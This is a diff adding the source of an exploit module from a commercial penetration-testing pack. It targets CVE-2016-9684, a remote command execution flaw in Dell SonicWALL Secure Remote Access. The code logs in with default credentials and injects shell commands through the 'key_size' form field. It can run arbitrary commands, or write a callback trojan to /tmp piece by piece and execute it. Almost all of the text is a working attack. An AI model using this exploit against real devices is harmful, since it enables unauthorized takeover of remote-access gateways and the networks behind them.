@@ -1,0 +1,192 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2017
+#
+
+import sys
+import random
+import time
+import thread
+import base64
+import urllib, urllib2
+import xml.sax.saxutils as saxutils
+
+if "." not in sys.path: 
+	sys.path.append(".")
+
+import libs.spkproxy as spkproxy
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+from libs.canvasos import *
+
+import struct
+import canvasengine
+import re
+
+# GUI info
+NAME = "Dell SonicWALL Secure Remote Access gencsr Remote Code Execution Vulnerability"
+
+DESCRIPTION = "Remote command execution vulnerability in Dell SonicWALL Secure Remote Access /cgi-bin/gencsr"
+DOCUMENTATION = {}
+DOCUMENTATION["VENDOR"] = "Dell"
+DOCUMENTATION["Date public"] = "2016.12.25"
+DOCUMENTATION["VersionsAffected"] = "8.1.0.2-14sv"
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION["References"] = ""
+DOCUMENTATION["CVE Name"] = "CVE-2016-9684"
+DOCUMENTATION["CVE Url"] = "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-9684"
+DOCUMENTATION["Notes"] = ""
+
+VERSION = "0.1"
+
+GTK2_DIALOG = "dialog.glade2"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Web Exploits"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Linux"] ]
+
+NOTES="""
+Usage:
+.\commandlineInterface.py -p 443 -v 12
+
+-- Single command mode --
+.\3rdparty\D2SEC\exploits\d2sec_sra\d2sec_sra.py -t 192.168.59.132 -l 192.168.1.1 -d 443 -O cmd:"id"
+
+-- Automatic MOSDEF trojan download and exec for Linux --
+.\3rdparty\D2SEC\exploits\d2sec_sra\d2sec_sra.py -v 0 -t 192.168.59.132 -l 192.168.1.1 -d 443
+"""
+
+CHANGELOG="""
+"""
+
+
+class theexploit(tcpexploit):
+    def __init__(self):
+    	tcpexploit.__init__(self)
+    	self.TROJANMODE = 0
+    	self.setInfo(DESCRIPTION)
+    	self.name = NAME       
+    	self.protocol = "https"
+    	self.port = 443
+    	self.version = 0
+    	self.cmd = ""
+    	self.username = "admin"
+    	self.password = "password"                
+    	self.trojanname = "d2"
+    	return
+
+ 
+    def maketrojan(self):    	
+    	t_os = canvasos("Linux")
+    	t_os.arch = "X86"	    
+    	self.buildmosdeftrojan(self.callback.ip, self.callback.port, target_os = t_os)        
+    	self.log("Writing out %d bytes to %s"%(len(self.mosdeftrojan), self.trojanname))        		
+    	file(self.trojanname, "wb").write(self.mosdeftrojan)
+    	self.setInfo("%s - done"%(NAME))
+    	ret = len(self.mosdeftrojan) != 0	
+    	return ret	
+
+
+    def neededListenerTypes(self):
+    	from canvasengine import LINUXMOSDEF
+    	return [LINUXMOSDEF]
+
+
+    def send_cmd(self, ua, cmd):    	    	    	
+        self.log("[D2SEC] %s"%cmd)
+        cmd = '`%s`'%cmd
+    	url = "/cgi-bin/gencsr"
+    	mainurl = "%s://%s:%d%s" % (self.protocol, self.host, self.port, url)
+        params = urllib.urlencode({'country':'USA', 'san':'ASDF', 'fqdn':'www.d2sec.com', 'county':'dallas', 'applyButt':'applyButt=', 'password':'d2', 'fullsan':'d2', 'organization':'d2', 'name':'d2', 'state':'d2', 'department':'d2', 'email':'d2@d2.com', 'key_size':'%s'%cmd})
+    	data = ua.POST(mainurl, params)    
+
+
+    def split_cmd(self, ua, cmd):    	    	
+    	n = 40
+    	todo = [cmd[i:i+n] for i in range(0, len(cmd), n)]        
+        self.send_cmd(ua, "rm -f /tmp/%s"%self.trojanname)        
+        self.send_cmd(ua, "touch /tmp/%s"%self.trojanname)
+        for t in todo:
+            self.send_cmd(ua, "printf \"%s\" >> /tmp/%s"%(t,self.trojanname))
+        self.send_cmd(ua, "chmod +rx /tmp/%s"%self.trojanname)                              
+        self.send_cmd(ua, "/tmp/%s"%self.trojanname)
+        
+  
+    def run(self):    	    	
+    	# Check arguments
+    	self.host = self.target.interface
+    	self.port = int(self.argsDict.get("port", self.port))
+    	self.username = self.argsDict.get("username", self.username)
+    	self.password = self.argsDict.get("password", self.password)
+                                
+    	if (self.argsDict.get("cmd", self.cmd) == ""):    
+    		self.maketrojan()
+    		hex_s = "".join("\\x%02x" % ord(b) for b in self.mosdeftrojan)	    		
+    		self.TROJANMODE = 1    		
+    		self.cmd = "printf \"" + hex_s + "\" > /tmp/" + self.trojanname + "; chmod +x /tmp/" + self.trojanname + "; /tmp/" + self.trojanname    			    		    		
+    	else:
+    		self.cmd = self.argsDict.get("cmd", self.cmd)
+        	               
+    	self.setInfo("%s attacking %s:%d (in progress)"%(NAME, self.host, self.port))                
+    	self.log("Attacking %s:%d"%(self.host, self.port))                
+      		
+    	ua = spkproxy.UserAgent("", exploit=self)
+    	ua.addHeader("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0")
+        
+    	# Authentication
+    	url = "/cgi-bin/userLogin"    	    
+    	mainurl = "%s://%s:%d%s" % (self.protocol, self.host, self.port, url)    	        
+        params = urllib.urlencode({'username':self.username, 'password':self.password, 'domain':'LocalDomain', 'loginButton':'Login', 'state':'login', 'login':'true', 'verifyCert':'0', 'portalname':'VirtualOffice', 'ajax':'true'})   	
+    	data = ua.POST(mainurl, params)    
+  
+        if "Login failed" in data:
+            self.log('[D2SEC] Authentication error')
+            return 0
+
+        # Exploitation
+        if self.TROJANMODE == 1:
+            self.split_cmd(ua, hex_s)
+            pass
+        else:                                        
+            self.send_cmd(ua, 'rm -f /usr/src/EasyAccess/www/htdocs/images/d2')
+            self.cmd = '%s > /usr/src/EasyAccess/www/htdocs/images/d2'%self.cmd
+            self.send_cmd(ua, self.cmd)
+
+            url = "/images/d2"    
+            mainurl = "%s://%s:%d%s" % (self.protocol, self.host, self.port, url)    	
+            data = ua.GET(mainurl)        	
+    	
+            if 'not available' in data:
+                self.log('[D2SEC] Result not available')
+                return 0
+            else:    	
+                self.log('[D2SEC] %s'%data)
+        
+    	return 1
+    	
+        		
+    def usage(self):        
+    	print "Usage: %s -t targethost -l localip -d localport [-O cmd:command]\n" % sys.argv[0]
+
+    	i = 0
+
+    	print 'Available versions:'
+
+    	for listline in targets.values():
+    		print '\t%d: %s'%(i, listline)
+    		i = i + 1
+
+    	sys.exit(0) 
+
+
+if __name__ == '__main__':
+	print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
+	app = theexploit()
+	ret = standard_callback_commandline(app)
